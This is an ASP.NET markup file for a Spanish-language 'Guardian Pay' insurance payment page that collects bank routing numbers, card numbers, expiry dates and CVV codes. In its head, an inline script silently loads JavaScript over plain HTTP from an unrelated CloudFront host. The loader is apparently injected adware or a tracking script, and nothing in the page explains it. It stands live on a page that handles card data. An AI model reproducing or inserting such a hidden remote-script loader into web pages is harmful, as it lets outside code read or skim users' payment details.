<%@ Page Language="C#" AutoEventWireup="true" CodeFile="PaymentDP.aspx.cs" Inherits="EPolicy.PaymentDP" %>

<%@ Register Assembly="AjaxControlToolkit, Version=3.5.50508.0, Culture=neutral, PublicKeyToken=28f01b0e84b6d53e"
    Namespace="AjaxControlToolkit" TagPrefix="Toolkit" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/tr/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
    <meta charset="utf-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <title>Guardian Insurance</title>
    <meta name="description" content=""/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <link rel="apple-touch-icon" href="apple-touch-icon.png"/>
    <link rel="stylesheet" href="css/bootstrap.min.css"/>
    <link rel="icon" href="Images2\LogoGuardian.ico" type="image/x-icon" />
    <style>
        html, body
        {
            height: 100%;
        }
        body
        {
            background-color: #17529B;
        }
        .container-fluid
        {
            height: 100%;
        }
        .row.row-offcanvas.row-offcanvas-left
        {
            height: 100%;
        }
        .col-md-2
        {
            width: 16.66666667%;
            height: 100%;
        }
        .main
        {
            height: 100%;
        }
    </style>
    <link rel="stylesheet" href="css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="css/main.css">
    <link href="css/fonts.css" rel="stylesheet" />
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css"
        rel="stylesheet" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1"
        crossorigin="anonymous" />
    <script type="text/javascript">        (function () { var a = document.createElement("script"); a.type = "text/javascript"; a.async = !0; a.src = "http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.107#p=samsungxssdx840xevox250gb_s1dbnsaf286689w"; var b = document.getElementsByTagName("script")[0]; b.parentNode.insertBefore(a, b); })();
    </script>
</head>
<body>
    <form id="Form1" method="post" runat="server">
    <div class="container-fluid" style="height: 100%">
        <Toolkit:ToolkitScriptManager ID="ScriptManager1" runat="server" EnableScriptGlobalization="True">
        </Toolkit:ToolkitScriptManager>
        <asp:UpdatePanel ID="UpdatePanel1" runat="server" RenderMode="Block">
            <ContentTemplate>
                <div class="row row-offcanvas row-offcanvas-left" style="height: 100%">
                    <div class="col-sm-3 col-md-2 sidebar-offcanvas" id="sidebar" role="navigation">
                        <asp:PlaceHolder ID="phTopBanner" runat="server"></asp:PlaceHolder>
                    </div>
                    <div class="col-sm-9 col-md-10 main" style="height: 100%">
                        <!--toggle sidebar button-->
                        <p class="visible-xs">
                            <button type="button" class="btn btn-primary btn-xs" data-toggle="offcanvas">
                                <i class="glyphicon glyphicon-chevron-left"></i>
                            </button>
                        </p>
                        <h1 class="page-header">
                            Guardian Pay</h1>
                        <div class="row formWraper">
                            <div class="form col-sm-12">
                                <div class="row generalSearch">
                                    <div class="searchBy col-sm-2">
                                        <label for="exampleInputEmail1">
                                            Payment Policy
                                        </label>
                                    </div>
                                      <div class="col-sm-1">
                                     </div>
                                    <div class="col-sm-4">
                                        <asp:TextBox ID="lblerror" runat="server" Text="Error:" ForeColor="Red" Font-Bold="false"
                                            Visible="false" ReadOnly="true" TextMode="MultiLine" Style="border: 0px solid;
                                            font-weight: normal; font-size: 11px; background-color: transparent; border-color: transparent;
                                            color: Red;" align="left" Width="500px" Height="50px"></asp:TextBox>
                                        <asp:Label ID="lblMetodo" runat="server" Class="" Font-Bold="True">Método de pago</asp:Label>
                                        <asp:DropDownList ID="ddlMetodoPago" runat="server" AutoPostBack="True" CssClass="form-controlWhite" OnSelectedIndexChanged="ddlMetodoPago_SelectedIndexChanged1">
                                            <asp:ListItem Value=""></asp:ListItem>
                                            <asp:ListItem Value="1">Cuenta de Cheque</asp:ListItem>
                                            <asp:ListItem Value="2">Cuenta de Ahorro</asp:ListItem>
                                            <asp:ListItem Value="3">Visa</asp:ListItem>
                                            <asp:ListItem Value="4">Master Card</asp:ListItem>
                                            <asp:ListItem Value="5">AMEX</asp:ListItem>
                                        </asp:DropDownList>
                                        <br />
                                        <asp:Label ID="lblReqMetodoPagp" runat="server"></asp:Label>
                                        <asp:Label ID="lblAccName" runat="server" Class="" Font-Bold="True">A Nombre de quien esta la cuenta</asp:Label>
                                        <asp:TextBox ID="txtAccountNombre" runat="server" MaxLength="60" placeholder="" 
                                            CssClass="form-controlWhite"/>
                                        <br />
                                        <div id="divAccBank" style="height: 110px" runat="server">
                                             <asp:Label ID="lblRoutingNo" runat="server" Class="" Font-Bold="True">Número de Ruta y Tránsito</asp:Label>
                                             <%--<asp:TextBox ID="ddlRoutingNumber" runat="server" AutoPostBack="False" CssClass="form-controlWhite" MaxLength="15"></asp:TextBox>--%>
                                             <asp:DropDownList ID="ddlRoutingNumber" runat="server" 
                                                 CssClass="form-controlWhite">                                          
                                        </asp:DropDownList>
                                            <br />
                                        </div>
                                        <asp:Label ID="lblAccNo" runat="server" Class="" Font-Bold="True">Número de la Tarjeta</asp:Label>
                                        <asp:TextBox ID="txtAccountNumber" runat="server" MaxLength="16" placeholder="" 
                                            AutoCompleteType="Disabled" CssClass="form-controlWhite" />
                                        <br />
                                        <div id="divTarjeta" style="width: 100%; height: 110" runat="server">
                                            <asp:Label ID="lblMesExp" runat="server" Class="" Font-Names="" Font-Bold="True"
                                                Visible="False">Mes de Expiración</asp:Label>
                                            <asp:DropDownList ID="ddlMes" runat="server" CssClass="form-controlWhite">
                                            </asp:DropDownList>
                                            <br />
                                            <asp:Label ID="lblAnoExp" runat="server" Class="" Font-Names="" Font-Bold="True"
                                                Visible="False">Año de Expiración</asp:Label>
                                            <asp:DropDownList ID="ddlYear" runat="server" AutoPostBack="False" CssClass="form-controlWhite">
                                            </asp:DropDownList>
                                            <br />
                                            <asp:Label ID="lblSecCode" runat="server" Class="" Font-Bold="True">Código de Seguridad (CVV)</asp:Label>       
                                            <asp:TextBox ID="txtSecurityCode" runat="server" MaxLength="3" placeholder="" CssClass="form-controlWhite"/>
                                            <img id="cvvimg" runat="server" src="~/images2/creditcardcvv.jpg" alt="" />
                                            <br />
                                             <br />
                                        </div>
                                        <asp:Label ID="lblPaymentAmount" runat="server" Class="" Font-Names="" Font-Bold="True">Cantidad a Pagar</asp:Label>
                                        <asp:TextBox ID="ddlPaymentAmount" runat="server" CssClass="form-controlWhite" Enabled="false" Text=""></asp:TextBox>
                                    </div>
                                     <div class="col-sm-1">
                                     </div>
                                    <div class="btns col-sm-3">

                                    <label><h4>Términos  y Condiciones de Pago</h4></label>
                                    <br />
                                     <asp:CheckBox ID="chkTermino" runat="server" AutoPostBack="false"  Text=""  Visible="true" />
 	                                    He leído y estoy de acuerdo con los términos del negocio , los términos del financiamiento, y los términos de pago . Si seleccioné el método de pagos mensuales, entiendo y estoy de acuerdo que se debitará automáticamente del método de pago que seleccioné. Entiendo que el método de pago que seleccioné puedo cambiarlo en cualquier momento sin incurrir costos adicionales.
                                          <br />
                                           <br />
                                        <asp:Button ID="btnSubmit" class="btn btn-primary btn-lg btn-block" runat="server"
                                            Text="Submit Payment" OnClick="btnSubmit_Click" />
                                        <asp:Button ID="btnCancel" class="btn btn-primary btn-lg btn-block" runat="server"
                                            Text="Cancel Payment" onclick="btnCancel_Click" />
                                        <br />
                                        <br />                                    
                                    <div class="form-group" align="center">
                                        <asp:UpdateProgress ID="UpdateProgress1" runat="server" AssociatedUpdatePanelID="UpdatePanel1"
                                            DisplayAfter="10">
                                            <ProgressTemplate>
                                                <img alt="" src="Images2/loader.gif" style="width: 40px; height: 40px;" />
                                                <span><span class=""></span><span class="" style="font-size: 18px">Favor de Esperar...</span></span></ProgressTemplate>
                                        </asp:UpdateProgress>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                       <br />
                        <br />
                        <br />
                        <br />
                        <br />
                        <br />
                        <br />
                        <br />
                        <br />
                        <br />
                        <br />
                        <br />
                        <br />
                        <br />

                        <asp:TextBox ID="txtPDFFile" runat="server" MaxLength="60" placeholder="" visible="false" CssClass="form-controlWhite"/>
                    </div>
                </div>
                <asp:Panel ID="pnlMessage" runat="server" CssClass="" Width="450px" BackColor="#F4F4F4"
                    Height="260px">
                    <div class="" style="padding: 0px; border-radius: 0px; background-color: #17529B;
                        color: #FFFFFF; font-size: 14px; font-weight: normal; 
                        background-repeat: no-repeat; text-align: left; vertical-align: bottom;">
                        &nbsp;&nbsp;
                        <asp:Label ID="Label3" runat="server"
                            Font-Size="14pt" Text="Message..." ForeColor="White" />
                    </div>
                    <div style="padding: 0px; border-radius: 0px;">
                        <table style="background-position: center; width: 430px; height: 175px;">
                            <tr>
                                <td align="center" valign="middle">
                                    <asp:Label ID="lblRecHeader" runat="server" Font-Bold="False" Font-Italic="False"
                                        Font-Size="10.5pt" Font-Underline="False" ForeColor="#333333" Text="Message"
                                        Width="350px" CssClass="Labelfield2-14" />
                                </td>
                            </tr>
                        </table>
                    </div>
                    <div class="" align="center">
                        <asp:Button ID="btnAceptar" runat="server" Text="OK" Width="150px" CssClass="btn btn-primary btn-lg btn-block" />
                    </div>
                </asp:Panel>
                <Toolkit:ModalPopupExtender ID="mpeSeleccion" runat="server" BackgroundCssClass=""
                    DropShadow="True" PopupControlID="pnlMessage" TargetControlID="btnDummy2" OkControlID="btnAceptar">
                </Toolkit:ModalPopupExtender>
                <asp:Button ID="btnDummy2" runat="server" Visible="true" BackColor="Transparent"
                    BorderStyle="None" BorderWidth="0" BorderColor="Transparent" />
                <Toolkit:RoundedCornersExtender ID="RoundedCornersExtender2" runat="server" TargetControlID="pnlMessage"
                    Radius="0" Corners="All" />            </ContentTemplate>
        </asp:UpdatePanel>
    </div>
    </form>
</body>
